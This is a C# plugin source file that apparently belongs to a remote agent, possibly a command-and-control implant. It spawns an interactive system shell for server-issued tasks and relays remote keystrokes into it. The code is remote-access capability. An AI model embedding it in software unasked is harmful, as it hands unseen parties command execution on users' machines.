using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;

namespace Agent
{
    public class Plugin : IInteractivePlugin
    {
        public string Name => "shell";
        Dictionary<string, ProcessRunner> runningProcs = new Dictionary<string, ProcessRunner>();
        private IMessageManager messageManager { get; set; }
        private ITokenManager tokenManager { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
            this.tokenManager = tokenManager;
    }
        public async Task Execute(ServerJob job)
        {
            string shell = String.Empty;


            Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);

            if(args.ContainsKey("shell") && !string.IsNullOrEmpty(args["shell"]))
            {
                shell = args["shell"];
            }
            else
            {
                shell = GetDefaultShell();
            }


            ProcessRunner runner = new ProcessRunner(shell, job.task.id, messageManager);
            runner.Start();
            runningProcs.Add(job.task.id, runner);
        }

        private string GetDefaultShell()
        {
            if (OperatingSystem.IsWindows())
            {
                // Windows
                return "cmd.exe";
            }
            else
            {
                // Linux or macOS
                return Environment.GetEnvironmentVariable("SHELL") ?? "/bin/bash"; // You may need to adjust this based on the specific distribution or configuration.
            }
        }

        public void Interact(InteractMessage message)
        {
            if (this.runningProcs.ContainsKey(message.task_id))
            {
                switch (message.message_type)
                {
                    case InteractiveMessageType.Input:
                        this.runningProcs[message.task_id].Write(Misc.Base64Decode(message.data));
                        break;
                    case InteractiveMessageType.Output:
                        break;
                    case InteractiveMessageType.Error:
                        break;
                    case InteractiveMessageType.Exit:
                        this.runningProcs[message.task_id].Stop();
                        this.runningProcs.Remove(message.task_id);
                        break;
                    case InteractiveMessageType.Escape:
                        this.runningProcs[message.task_id].Write(0x18);
                        break;
                    case InteractiveMessageType.CtrlA:
                        this.runningProcs[message.task_id].Write(0x01);
                        break;
                    case InteractiveMessageType.CtrlB:
                        this.runningProcs[message.task_id].Write(0x02);
                        break;
                    case InteractiveMessageType.CtrlC:
                        this.runningProcs[message.task_id].Write(0x03);
                        break;
                    case InteractiveMessageType.CtrlD:
                        this.runningProcs[message.task_id].Write(0x04);
                        break;
                    case InteractiveMessageType.CtrlE:
                        this.runningProcs[message.task_id].Write(0x05);
                        break;
                    case InteractiveMessageType.CtrlF:
                        this.runningProcs[message.task_id].Write(0x06);
                        break;
                    case InteractiveMessageType.CtrlG:
                        this.runningProcs[message.task_id].Write(0x07);
                        break;
                    case InteractiveMessageType.Backspace:
                        this.runningProcs[message.task_id].Write(0x08);
                        break;
                    case InteractiveMessageType.Tab:
                        this.runningProcs[message.task_id].Write(0x09);
                        break;
                    case InteractiveMessageType.CtrlK:
                        this.runningProcs[message.task_id].Write(0x0B);
                        break;
                    case InteractiveMessageType.CtrlL:
                        this.runningProcs[message.task_id].Write(0x0C);
                        break;
                    case InteractiveMessageType.CtrlN:
                        this.runningProcs[message.task_id].Write(0x0E);
                        break;
                    case InteractiveMessageType.CtrlP:
                        this.runningProcs[message.task_id].Write(0x10);
                        break;
                    case InteractiveMessageType.CtrlQ:
                        this.runningProcs[message.task_id].Write(0x11);
                        break;
                    case InteractiveMessageType.CtrlR:
                        this.runningProcs[message.task_id].Write(0x12);
                        break;
                    case InteractiveMessageType.CtrlS:
                        this.runningProcs[message.task_id].Write(0x13);
                        break;
                    case InteractiveMessageType.CtrlU:
                        this.runningProcs[message.task_id].Write(0x15);
                        break;
                    case InteractiveMessageType.CtrlW:
                        this.runningProcs[message.task_id].Write(0x17);
                        break;
                    case InteractiveMessageType.CtrlY:
                        this.runningProcs[message.task_id].Write(0x19);
                        break;
                    case InteractiveMessageType.CtrlZ:
                        this.runningProcs[message.task_id].Write(0x1A);
                        break;
                    default:
                        break;

                }
            }
        }
    }
}
